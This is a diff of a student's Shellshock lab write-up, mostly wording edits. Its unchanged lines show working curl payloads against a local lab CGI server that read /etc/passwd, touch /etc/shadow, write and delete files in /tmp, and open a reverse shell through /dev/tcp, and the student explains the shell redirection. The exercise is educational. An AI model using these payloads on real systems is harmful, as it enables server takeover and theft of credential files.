@@ -228,7 +228,7 @@ SCRIPT_NAME=/cgi-bin/getenv.cgi
 * Connection #0 to host www.seedlab-shellshock.com left intact
 ```
 
--e will send the "Referrer Page" information to the HTML server. Additionally, it will not keep the last -e if multiple of them are used.
+-e will send the "Referrer Page" information to the HTML server. Additionally, it will only keep the last -e modification if multiple of them are used.
 
 4. Running with -H:
 ```
@@ -284,6 +284,7 @@ SCRIPT_NAME=/cgi-bin/getenv.cgi
 
 ### Task 3:
 
+I understand how it suppose to be one curl option for each task; however, I wanted to make sure it was going to be clear for me when I come back later. Therefore, I did the three options for each task.  
 #### Task 3.1:
 I am trying to access /etc/passwd:
 ```
@@ -324,7 +325,7 @@ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 100   926    0   926    0     0   452k      0 --:--:-- --:--:-- --:--:--  452k
 [02/16/21]seed@VM:~/.../02_shellshock$ diff 3_1_1.txt 3_1_3.txt
 ```
-1. I called the operation and combined what I learned from Task 1 with it, defining a function. Then the echo Content_type is not really needed, but I have included there. Followed by a necessary echo. Then the command I would like to use /bin/cat and the file I would like to use it on /etc/passwd. Lastly, I have the server address. (P.S. I just stored the output as a text file in the end).
+1. I called the operation and combined what I learned from Task 1 with it, defining a function. Then the echo Content_type is not really needed, but I have included there. Followed by a necessary echo. Then the command I would like to use, /bin/cat, and the file I would like to use it on, /etc/passwd. Lastly, I have the server address. (P.S. I just stored the output as a text file in the end).
 2. I first did this operation in -A, but when I gave it a second thought, I decided to try the other two. The -e is identical to -A, the only difference is the choice of option itself. Then I ran -H, which I had to define a key to it, named temp, but the results are the same. Notice that I ran a diff command and not display the whole thing. If you would like to view all the outputs, please take a look at [-A](3_1_1.txt), [-e](3_1_2.txt), and [-H](3_1_3.txt). Finally, the -v printed the versions and not the output I was looking for.
 3. My attack was successful, I have made the program print the /etc/passwd instead of the environment variable. I was a little surprised at all three options working for curl. However, giving it a second thought, it makes perfect sense. They are all doing some different task, but in the end, all the information is stored as a environment variable.
 
@@ -339,8 +340,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 1. First, I gave it the same input output command like last time but received an error. However, I quickly realize that when we print the id, we would not ask for cat, but we would if we are asking for /etc/passwd (given that you have privilege). Then I tried it without /bin/cat and worked just fine.
-2. Like last time, I decided to try all three curl operations that I could think of and they all worked perfectly. Again, -v printed the version and not /bin/id
-3. My attack was successful. For all three of the curl options, I made the them print out the /bin/id. The only surprise was it not using the /bin/cat, which was discussed above
+2. Like last time, I decided to try all three curl operations that I could think of and they all worked perfectly. Again, -v printed the version and not /bin/id.
+3. My attack was successful. For all three of the curl options, I made the them print out the /bin/id. The only surprise was it not using the /bin/cat, which was discussed above.
 
 #### Task 3.3:
 For this task, I am trying to create a file inside /tmp folder:
@@ -386,7 +387,7 @@ this is a test
 [02/16/21]seed@VM:~/.../image_www$ curl -H temp:'() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
 this is a test
 ```
-1. Creating this one was very different. First, I tried using touch, which means I have to go find the file to display it. Then to make thing more clearer, I decided to add some text to it; thus, I used echo "some string" > /tmp/somelocation. Finally I would display the information from the idea I practiced on task 3.1, /bin/cat.
+1. Creating this one was very different. First, I tried using touch, which means I have to go to tmp to find the file and display it, but that was just confusing for the code. Thus, to try and make thing more clearer, I decided to add some text to it; thus, I used echo "some string" > /tmp/somelocation. Finally I would display the information from the idea I practiced on task 3.1, /bin/cat.
 2. Again, I used all three options and the answer seems right. In fact, I even did rm, next part in here and the solution looks correct as well.
 3. My attack was successful, I was able to store something in those test file in the tmp folder. The only thing that surprised me was echo "string" > location. Although I have seen this before, it just did not pop into my head until some further digging.
 
@@ -409,9 +410,9 @@ this is a test
 [02/16/21]seed@VM:~/.../image_www$ curl -H  temp:'() { :; }; echo; /bin/rm /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
 [02/16/21]seed@VM:~/.../image_www$ curl -H  temp:'() { :; }; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
 ```
-1. For this one, the syntax, or the order of placement is very similar to /bin/cat. I took sometime to look for the location of rm, which is in /bin as well. The rest are the same. curl -option (declaration if -H:)'declare the function; echo; <file of the command> <file of data> ' server
+1. For this one, the syntax, or the order of placement is very similar to /bin/cat. I took sometime to look for the location of rm, which is in /bin as well. The rest are the same. curl -option (declaration if -H:)'declare the function; echo; file_of_the_command file_of_data ' server
 2. For this one, I tested all three again. And all of them worked. Please note that I've skipped the lines that I used to add the string back.
-3. My attack was successful. Overall, this one came with zero surprise, I kind of did this portion when I was testing for my create a file. Additionally, the syntax is almost identical to /bin/cat.
+3. My attack was successful. Overall, this one came with zero surprise, I kind of did this portion when I was testing for my Task 3.3. Additionally, the syntax is almost identical to /bin/cat.
 
 #### Task 3.5:
 I am trying to get the information from /etc/shadow:
@@ -494,7 +495,7 @@ veth23da45d: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 [02/16/21]seed@VM:~/.../02_shellshock$ curl -A '() { :; }; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/172.17.0.1/9090 0<&1 2<&1' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
 ```
-This one was pretty similar to the descriptions. I followed the guild and made a few changes. First, I used ifconfig to find the IP address. Since I was not 100% sure, I tried many of them until it was clear that it is docker0. Then I modified the command from /bin/bash -i ... to using curl to ask it to wait for some commands. Lastly, once everything was done, I was able to type id on the attacker and the server's id showed up. /bin/bash is the bash that we are using. i is interactive, which means that shell is interactive. > /dev/tcp/172.17.0.1/9090 causes the output device stdout of the shell to be redirected to the TCP connection to IP's port. 0<&1 is stdin, stdout. 2>&1 is stderr, stdout. The vulnerability at this point becomes more clear to me. If we were only talking about the hard-coding, I did not think it was going to cause such a headache. However, after looking at how an attack could easily take over the server, I began to understand the problem.
+This one was pretty similar to the descriptions. I followed the guild and made a few changes. First, I used ifconfig to find the IP address. Since I was not 100% sure, I tried many of them until it was clear that it is docker0. Then I modified the command from /bin/bash -i ... to using curl to complete some action. Lastly, once everything was done, I was able to type id on the attacker and the server's id showed up. /bin/bash is the bash that we are using. i is interactive, which means that shell is interactive. > /dev/tcp/172.17.0.1/9090 causes the output device stdout of the shell to be redirected to the TCP connection to IP's port. 0<&1 is stdin, stdout. 2>&1 is stderr, stdout. The vulnerability at this point becomes more clear to me. If we were only talking about the hard-coding, I did not think it was going to cause such a headache. However, after looking at how an attack could easily take over the server, I began to understand the problem.
 
 ### Task 5:
 In this task, I am using the patched bash. First, I went into getenv.cgi and changed the first line from /bin/bash_shellshock to /bin/bash. Then I repeated Task 3:
@@ -707,4 +708,4 @@ QUERY_STRING=
 REQUEST_URI=/cgi-bin/getenv.cgi
 SCRIPT_NAME=/cgi-bin/getenv.cgi
 ```
-As we can see, task 4 has failed as well. Overall, we can see that we are running the actual getenv.cgi every time. Since the code asked for print the environ, that is our result. We have not gotten around it. Even after trying all curl options and doing something like task 4. However, it is also good to hear that such a vulnerable bug has been fixed and it was patched. In the end, it was very clear the difference between /bin/bash_shellshock and /bin/bash.
+As we can see, task 4 has failed as well. Overall, we can see that we are running the actual getenv.cgi every time. Since the code asked for print the environ, that is our result. We have not gotten around it, even after trying all curl options and doing the same for task 4. It is also good to hear that such a vulnerable bug has been fixed and it was patched. In the end, it was very clear the difference between /bin/bash_shellshock and /bin/bash.
